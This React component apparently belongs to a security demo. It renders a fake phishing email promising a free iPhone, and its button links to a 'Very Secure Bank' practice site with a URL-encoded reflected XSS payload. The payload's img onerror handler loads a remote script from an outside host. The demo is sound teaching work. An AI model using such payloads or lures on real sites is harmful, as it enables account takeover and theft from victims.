import React from 'react'
import { Box, Text, Link, Button, Tag, HStack, Tooltip, Heading, Image, } from '@chakra-ui/react'
import { ExternalLinkIcon } from '@chakra-ui/icons'

const VerySecureBank = () => {

  return (
    <Box>
      <Heading mb={4} fontSize={'xl'} as ='h3'><Link _hover={{textDecoration: 'none'}} isExternal href='https://xd-bank.herokuapp.com/'>Very Secure Bank <ExternalLinkIcon /></Link></Heading>
      <Text>Let's assume this is your email inbox</Text>
      <HStack mb={8} mt={2}>
        <Tooltip label="Cross Site Scripting">
          <Tag _hover={{cursor: 'pointer'}} colorScheme={'red'}>#XSS</Tag>
        </Tooltip>
      </HStack>
      

      <Text>from: hacker@email.com</Text>
      <Text>to: you@email.com</Text>
      <Text>date: {Date()}</Text>
      <Text>subject: iPhone Give Away 🎁</Text>
      <Image h={300} my={5} src="https://i.pinimg.com/originals/fd/2c/1a/fd2c1a96b654e220d09525f006482477.gif" />
      <Text>Congratulations!! 🎉🎉 You win an iPhone 13 Pro Max</Text>
      <Image h={200} my={5} src="https://mms.businesswire.com/media/20201013006005/en/829823/23/iPhone12Pro-hero-pacific-blue-2Up-angled.jpg" />
      
      <Text>👇👇 Claim your iPhone below 👇👇</Text>
      <Link _hover={{textDecoration: 'none'}} isExternal href="https://xd-bank.herokuapp.com/faq?q=%3Cimg%20src%3D%22%23%22%20onerror%3D%22var%20a%3Ddocument.createElement%28%27script%27%29%3Ba.src%3D%27https%3A%2F%2Fwww.chhaileng.com%2Fxss.js%27%3Bdocument.body.appendChild%28a%29%22%2F%3E"><Button colorScheme={'green'} my={5}>Get Free iPhone</Button></Link>
    </Box>
  )
}

export default VerySecureBank